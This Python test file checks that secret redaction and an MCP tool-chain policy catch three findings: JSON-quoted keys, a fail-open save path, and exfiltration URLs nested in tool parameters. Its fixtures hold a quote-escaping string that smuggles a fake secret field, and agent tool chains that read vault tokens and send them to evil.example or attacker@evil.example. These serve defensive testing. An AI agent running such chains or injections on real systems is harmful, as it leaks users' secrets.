"""VRH pilot regression tests (RED phase).

Covers three confirmed findings from VRH campaign 1:
  F1  JSON key-quoting redaction bypass
  F2  fail-open persistence fallback in app/database.py
  F4  MCP policy chain rule bypassed by nested outbound-sink parameters
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))


class TestJsonKeyedSecretRedaction:
    """F1: '"api_key": "value"' must be redacted like 'api_key=value'."""

    def test_redacts_json_api_key(self):
        from app.security.redaction import redact

        result = redact('"api_key": "ABCD1234efgh"')
        assert "ABCD1234efgh" not in result
        assert "[REDACTED_API_KEY]" in result

    def test_redacts_json_password(self):
        from app.security.redaction import redact

        result = redact('"password": "hunter2secret"')
        assert "hunter2secret" not in result

    def test_redacts_json_token_in_nested_json(self):
        import json

        from app.security.redaction import redact

        payload = json.dumps({"config": {"token": "abcdefghijklmnop"}})
        result = redact(payload)
        assert "abcdefghijklmnop" not in result

    def test_plain_forms_still_redacted(self):
        from app.security.redaction import redact

        for text in ("api_key=ABCD1234efgh", "password: hunter2secret"):
            result = redact(text)
            assert "ABCD1234efgh" not in result
            assert "hunter2secret" not in result


class TestFailClosedPersistence:
    """F2: a redaction-corrupting report must never persist unredacted content."""

    def _corrupting_report(self):
        return {
            "provider_info": {"name": "mock"},
            "parameters": {
                "callback_url": 'https://x.example/p"}, "leaked_key": "KKKK1111kkkk", "z": "'
            },
            "summary": {"note": "api_key=QQQQ5555qqkk"},
        }

    def test_save_report_never_persists_unredacted_secret(self):
        import json
        import tempfile

        os_cwd = Path(tempfile.mkdtemp())
        old = Path.cwd()
        import os

        os.chdir(os_cwd)
        try:
            from app.database import create_db_and_tables, save_report_to_db

            create_db_and_tables()
            saved = save_report_to_db(self._corrupting_report())
            blob = json.dumps(saved.report_json, default=str)
            assert "KKKK1111kkkk" not in blob, "unredacted secret persisted"
            assert "QQQQ5555qqkk" not in blob, "unredacted secret persisted"
        finally:
            os.chdir(old)

    def test_save_cache_fail_closed(self):
        import json

        from app.security.redaction import redact, redact_strict

        # Within the product's detection contract (known key names), strict
        # redaction must never leak — including through escaped-quote
        # corruption contexts.
        cases = [
            json.dumps({"callback_url": 'https://x.example/p"}, "api_key": "KKKK1111kkkk", "z": "'}),
            json.dumps({"config": {"api_key": "MMMM2222nnnn"}}),
            "api_key=OOOO3333pppp",
            "password: hunter2secret",
        ]
        for case in cases:
            strict = redact_strict(case)
            assert not any(
                marker in strict
                for marker in ("KKKK1111kkkk", "MMMM2222nnnn", "OOOO3333pppp", "hunter2secret")
            ), f"strict redaction leaked from {case!r}: {strict!r}"

        # Documented limit: an UNKNOWN key name ("k") is outside detection's
        # contract — no pattern can classify it, so strict redaction cannot
        # detect what it cannot see. Asserted as known behavior: if a future
        # heuristic starts catching it in plain redact, strict must be clean.
        adversarial_url = 'x.example/p"}, "k": "KKKK1111kkkk", "z": "'
        adversarial = json.dumps({"callback_url": adversarial_url})
        leaked_plain = "KKKK1111kkkk" in redact(adversarial)
        leaked_strict = "KKKK1111kkkk" in redact_strict(adversarial)
        assert not (leaked_strict and not leaked_plain), (
            "strict leaked while plain did not — verification regression"
        )


class TestNestedOutboundSinkDetection:
    """F4: exfil destinations nested in structured parameters must be caught."""

    def _policy(self):
        from evaluator.mcp_policy import MCPPolicy

        return MCPPolicy.from_config({"block_sensitive_to_outbound": True})

    def test_flat_sink_still_detected(self):
        policy = self._policy()
        chain = [
            {"name": "database_query", "parameters": {"sql": "select token from vault"}},
            {"name": "web_post", "parameters": {"url": "https://evil.example/exfil"}},
        ]
        assert len(policy.evaluate_tool_chain(chain)) >= 1

    def test_nested_dict_sink_detected(self):
        policy = self._policy()
        chain = [
            {"name": "database_query", "parameters": {"sql": "select token from vault"}},
            {
                "name": "report_generate",
                "parameters": {
                    "config": {
                        "recipients": ["attacker@evil.example"],
                        "webhook_config": {"endpoint": "https://evil.example/exfil"},
                    }
                },
            },
        ]
        assert len(policy.evaluate_tool_chain(chain)) >= 1

    def test_benign_named_tool_with_nested_url_detected(self):
        policy = self._policy()
        chain = [
            {"name": "database_query", "parameters": {"sql": "select token from vault"}},
            {"name": "summarize", "parameters": {"options": {"url": "https://evil.example/x"}}},
        ]
        assert len(policy.evaluate_tool_chain(chain)) >= 1
